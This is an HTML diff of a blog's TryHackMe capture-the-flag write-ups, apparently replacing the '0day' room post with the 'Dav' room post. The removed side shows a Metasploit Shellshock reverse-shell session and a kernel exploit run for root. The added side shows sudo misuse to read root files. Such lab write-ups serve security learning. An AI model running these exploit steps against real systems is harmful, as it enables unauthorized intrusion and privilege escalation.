-</span></span><span class="line"><span class="cl">... results ...
-</span></span><span class="line"><span class="cl">   <span class="m">27</span>  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> payload <span class="m">27</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell/reverse_tcp
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> lhost 10.8.95.227
-</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.8.95.227
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; show options
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span>:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name            Current Setting    Required  Description
-</span></span><span class="line"><span class="cl">   ----            ---------------    --------  -----------
-</span></span><span class="line"><span class="cl">   CMD_MAX_LENGTH  <span class="m">2048</span>               yes       CMD max line length
-</span></span><span class="line"><span class="cl">   CVE             CVE-2014-6271      yes       CVE to check/exploit <span class="o">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   HEADER          User-Agent         yes       HTTP header to use
-</span></span><span class="line"><span class="cl">   METHOD          GET                yes       HTTP method to use
-</span></span><span class="line"><span class="cl">   Proxies                            no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
-</span></span><span class="line"><span class="cl">   RHOSTS          0day.thm           yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-</span></span><span class="line"><span class="cl">   RPATH           /bin               yes       Target PATH <span class="k">for</span> binaries used by the CmdStager
-</span></span><span class="line"><span class="cl">   RPORT           <span class="m">80</span>                 yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   SSL             <span class="nb">false</span>              no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
-</span></span><span class="line"><span class="cl">   SSLCert                            no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   TARGETURI       /cgi-bin/test.cgi  yes       Path to CGI script
-</span></span><span class="line"><span class="cl">   TIMEOUT         <span class="m">5</span>                  yes       HTTP <span class="nb">read</span> response timeout <span class="o">(</span>seconds<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   URIPATH                            no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   VHOST                              no        HTTP server virtual host
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   SRVHOST  0.0.0.0          yes       The <span class="nb">local</span> host or network interface to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0 to listen on a
-</span></span><span class="line"><span class="cl">                                       ll addresses.
-</span></span><span class="line"><span class="cl">   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>linux/x86/shell/reverse_tcp<span class="o">)</span>:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   LHOST  10.8.95.227      yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Exploit target:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Id  Name
-</span></span><span class="line"><span class="cl">   --  ----
-</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Linux x86
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; exploit
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.8.95.227:4444
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.46% <span class="k">done</span> <span class="o">(</span>1097/1092 bytes<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">36</span> bytes<span class="o">)</span> to 10.10.152.56
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.8.95.227:4444 -&gt; 10.10.152.56:48442<span class="o">)</span> at 2023-06-12 16:32:43 +0530
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</span></span><span class="line"><span class="cl">whoami
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ whoami
 </span></span><span class="line"><span class="cl">www-data
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shell
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to find binary <span class="s1">&#39;python&#39;</span> on the target machine
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found python at /usr/bin/python
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using <span class="sb">`</span>python<span class="sb">`</span> to pop up an interactive shell
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to find binary <span class="s1">&#39;bash&#39;</span> on the target machine
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found bash at /bin/bash
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/usr/lib/cgi-bin$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">test.cgi
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/usr/lib/cgi-bin$ <span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">ryan
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home$ <span class="nb">cd</span> ryan
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ryan
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home/ryan$ ls
-</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">merlin
+</span></span><span class="line"><span class="cl">wampp
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> merlin
+</span></span><span class="line"><span class="cl">$ ls
 </span></span><span class="line"><span class="cl">user.txt
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home/ryan$ cat user.txt
-</span></span><span class="line"><span class="cl">cat user.txt
-</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Sh3llSh0ck_r0ckz<span class="o">}</span>
+</span></span><span class="line"><span class="cl">$ cat user.txt
+</span></span><span class="line"><span class="cl">449b40fe93f78a938523b7e4dcd66d2a
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="root-flag">root flag</h2>
-<p>After executing <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a>, we got the exploit <a href="https://www.exploit-db.com/exploits/37292">exploit</a>.</p>
-<p>compile exploit using gcc.<br />
-<code>gcc ofs.c -o ofs</code></p>
-<p>Upload to server using <code>python -m http.server</code></p>
-<p>Run binary to get root!!</p>
+</div><h2 id="root-flag">Root flag</h2>
+<p>we can use <code>/bin/cat</code> as sudo user.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/tmp$ ./ofs
-</span></span><span class="line"><span class="cl">./ofs
-</span></span><span class="line"><span class="cl">spawning threads
-</span></span><span class="line"><span class="cl">mount <span class="c1">#1</span>
-</span></span><span class="line"><span class="cl">mount <span class="c1">#2</span>
-</span></span><span class="line"><span class="cl">child threads <span class="k">done</span>
-</span></span><span class="line"><span class="cl">/etc/ld.so.preload created
-</span></span><span class="line"><span class="cl">creating shared library
-</span></span><span class="line"><span class="cl">whoami
-</span></span><span class="line"><span class="cl">root
-</span></span><span class="line"><span class="cl">cat /root/root.txt
-</span></span><span class="line"><span class="cl">THM<span class="o">{</span>g00d_j0b_0day_isPleased<span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ubuntu:/home/merlin$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/cat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here is the <code>/etc/shadow</code> file and I have tried to use john in order to crack this hash. But it is of no use. Then I remember… we have <code>cat</code> as root.</p>
+<p>Simply reading root file will also work!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ubuntu:/$ sudo cat /root/root.txt
+</span></span><span class="line"><span class="cl">sudo cat /root/root.txt
+</span></span><span class="line"><span class="cl">101101ddc16b0cdf65ba0b8a7af7afa5
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -2370,13 +2103,13 @@ letmein          (./rsa_private_key)
     
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-0day%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-dav%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
         </a>
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Writeup%20-%200day%20Room&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-0day%2f&hashtags=TryHackMe%2cShellshock%2cHashCracking&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Writeup%20-%20Dav%20Room&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-dav%2f&hashtags=TryHackMe%2cApache%2cWebdav&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2513,6 +2246,10 @@ letmein          (./rsa_private_key)
     <ul class="related-ul">
         
         <li>
+          <a href="/posts/tryhackme-0day/" class="related__link">TryHackMe Writeup - 0day Room</a>
+        </li>
+        
+        <li>
           <a href="/posts/tryhackme-anonforce/" class="related__link">TryHackMe Writeup - Anonforce Room</a>
         </li>
         
@@ -2523,21 +2260,14 @@ letmein          (./rsa_private_key)
 <nav class="pagination-single">
   
     
-      <a href="https://g4nd1v.github.io/posts/tryhackme-anonforce/" class="pagination-single__left">
+      <a href="https://g4nd1v.github.io/posts/tryhackme-0day/" class="pagination-single__left">
         <div class="pagination-single__icon">
           <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
         </div>
-        <div class="pagination-single__left-title">TryHackMe Writeup - Anonforce Room</div>      
+        <div class="pagination-single__left-title">TryHackMe Writeup - 0day Room</div>      
       </a>
     
     <div class="grow"></div>
-    
-      <a href="https://g4nd1v.github.io/posts/tryhackme-dav/" class="pagination-single__right">      
-        <div class="pagination-single__right-title">TryHackMe Writeup - Dav Room</div>
-        <div class="pagination-single__icon">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
-        </div>
-      </a>
     
   
 </nav>
@@ -2895,9 +2625,9 @@ document.addEventListener('DOMContentLoaded', function () {
   <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user-flag">user flag</a></li>
-    <li><a href="#root-flag">root flag</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#user-flag">User flag</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
   </ul>
 </nav>
   </div>
